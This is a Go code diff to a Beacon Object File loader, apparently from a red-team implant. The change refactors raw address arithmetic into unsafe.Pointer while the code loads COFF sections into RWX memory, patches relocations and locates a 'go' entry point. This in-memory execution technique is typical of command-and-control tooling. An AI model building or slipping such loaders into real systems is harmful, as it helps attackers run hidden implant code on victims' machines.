@@ -73,7 +73,7 @@ type coffSymbol struct {
 
 type sectionAlloc struct {
 	hdr  *coffSectionHeader
-	mem  uintptr
+	mem  unsafe.Pointer // VirtualAlloc RWX memory — not GC-managed
 	size uint32
 }
 
@@ -407,7 +407,7 @@ func findBOFEntry(data []byte, symOff uintptr, symCount uint32, strOff uintptr, 
 		if name == "go" || name == "beacon_main" || name == "_go" || name == "_beacon_main" {
 			if sym.SectionNumber > 0 && int(sym.SectionNumber)-1 < len(secs) {
 				s := secs[int(sym.SectionNumber)-1]
-				return s.mem + uintptr(sym.Value), nil
+				return uintptr(unsafe.Add(s.mem, sym.Value)), nil
 			}
 		}
 	}
@@ -461,9 +461,10 @@ func RunBOF(coffBytes []byte, args []byte) (*BOFResult, error) {
 			bofFreeAll(sections)
 			return res, fmt.Errorf("VirtualAllocEx(section %d): %v", i, e)
 		}
-		dst := unsafe.Slice((*byte)(unsafe.Pointer(mem)), sz)
+		memPtr := unsafe.Pointer(mem) //nolint:unsafeptr -- VirtualAlloc result, not GC-managed
+		dst := unsafe.Slice((*byte)(memPtr), sz)
 		copy(dst, coffBytes[sh.PointerToRawData:sh.PointerToRawData+sz])
-		sections[i] = sectionAlloc{hdr: sh, mem: mem, size: sz}
+		sections[i] = sectionAlloc{hdr: sh, mem: memPtr, size: sz}
 	}
 	defer bofFreeAll(sections)
 
@@ -480,7 +481,7 @@ func RunBOF(coffBytes []byte, args []byte) (*BOFResult, error) {
 			if secIdx >= len(sections) {
 				return 0, fmt.Errorf("section index %d out of range", secIdx)
 			}
-			return sections[secIdx].mem + uintptr(sym.Value), nil
+			return uintptr(unsafe.Add(sections[secIdx].mem, sym.Value)), nil
 		}
 		name := coffSymName(sym, coffBytes, strTableOff)
 		return resolveExternalSym(name)
@@ -489,7 +490,7 @@ func RunBOF(coffBytes []byte, args []byte) (*BOFResult, error) {
 	// ── Apply relocations ─────────────────────────────────────────────────
 	for i := range sections {
 		sh := sections[i].hdr
-		if sh.NumberOfRelocations == 0 || sections[i].mem == 0 {
+		if sh.NumberOfRelocations == 0 || sections[i].mem == nil {
 			continue
 		}
 		relocBase := uintptr(sh.PointerToRelocations)
@@ -501,15 +502,15 @@ func RunBOF(coffBytes []byte, args []byte) (*BOFResult, error) {
 			if err != nil {
 				return res, fmt.Errorf("reloc %d: %w", r, err)
 			}
-			patch := sections[i].mem + uintptr(rel.VirtualAddress)
+			patchPtr := unsafe.Add(sections[i].mem, rel.VirtualAddress)
 			switch rel.Type {
 			case imageRelAMD64Rel32:
-				delta := int32(int64(target) - int64(patch+4))
-				*(*int32)(unsafe.Pointer(patch)) += delta
+				delta := int32(int64(target) - int64(uintptr(patchPtr)+4))
+				*(*int32)(patchPtr) += delta
 			case imageRelAMD64Addr64:
-				*(*uint64)(unsafe.Pointer(patch)) = uint64(target)
+				*(*uint64)(patchPtr) = uint64(target)
 			case imageRelAMD64Addr32NB:
-				*(*uint32)(unsafe.Pointer(patch)) = uint32(target)
+				*(*uint32)(patchPtr) = uint32(target)
 			}
 		}
 	}
@@ -559,8 +560,8 @@ func RunBOF(coffBytes []byte, args []byte) (*BOFResult, error) {
 
 func bofFreeAll(secs []sectionAlloc) {
 	for _, s := range secs {
-		if s.mem != 0 {
-			procVirtualFreeEx.Call(uintptr(^uintptr(0)-1), s.mem, 0, uintptr(memRelease))
+		if s.mem != nil {
+			procVirtualFreeEx.Call(uintptr(^uintptr(0)-1), uintptr(s.mem), 0, uintptr(memRelease))
 		}
 	}
 }
